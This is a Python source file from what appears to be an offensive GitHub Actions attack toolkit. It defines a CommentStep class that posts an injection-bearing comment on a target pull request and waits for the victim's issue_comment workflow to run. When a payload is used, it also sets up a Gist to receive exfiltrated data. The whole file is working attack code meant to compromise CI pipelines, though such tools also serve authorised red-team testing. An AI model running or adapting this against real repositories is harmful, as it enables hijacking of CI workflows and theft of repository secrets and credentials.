import time

from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.cli.output import Output

from gatox.attack.utilities import AttackUtilities


class CommentStep(AttackStep):
    """Step representing a specific issue comment to make on an issue or a pull request."""

    def __init__(
        self, target_repo, target_workflow, comment: str, has_payload: bool = False
    ):
        self.comment = comment
        self.has_payload = has_payload
        self.target_repo = target_repo
        self.target_workflow = target_workflow

    def setup(self, api):
        """Set up the exfil Gist."""

        # Validate workflow exists on target repo
        workflow = api.get_workflow(self.target_repo, self.target_workflow)

        if not workflow:
            Output.error(
                "The target repository does not have the workflow specified, this attack cannot work."
            )

        if self.has_payload:
            catcher_gist, gist_id = AttackUtilities.create_exfil_gist(
                api, self.exfil_credential
            )

            Output.info(f"Created exfil gist: {gist_id}")

            Output.warn(
                "This is a comment injection attack, please format the previous payload in a manner that will run in the workflow."
            )

            Output.info("Enter 'Confirm' when ready to continue.")

            user_input = input()
            if user_input.lower() != "confirm":
                Output.warn("Exiting attack!")
                return False

            self.output["catcher_gist"] = catcher_gist
            self.output["exfil_gist"] = gist_id

    @AttackStep.require_params("pr_number")
    def preflight(self, api, pr_number=None):
        """ """

        current_user = api.get_user()
        # Verify that the PR was created.

        # Issue a comment on it
        api.create_comment(self.target_repo, pr_number, self.comment)

        # Check for the PR workflow
        Output.info(f"Waiting for {self.target_workflow} to be triggered by user...")
        runs = []
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            runs = api.get_workflow_runs_by_user_and_trigger(
                self.target_repo,
                current_user,
                self.target_workflow,
                ["issue_comment"],
            )
            if not runs:
                time.sleep(5)
            else:
                Output.info("Pull request triggered!")
                break
        if not runs:
            Output.info(
                f"Unable to get runs triggered by user for {self.target_workflow}!"
            )
            self.output["status"] = "FAILURE"
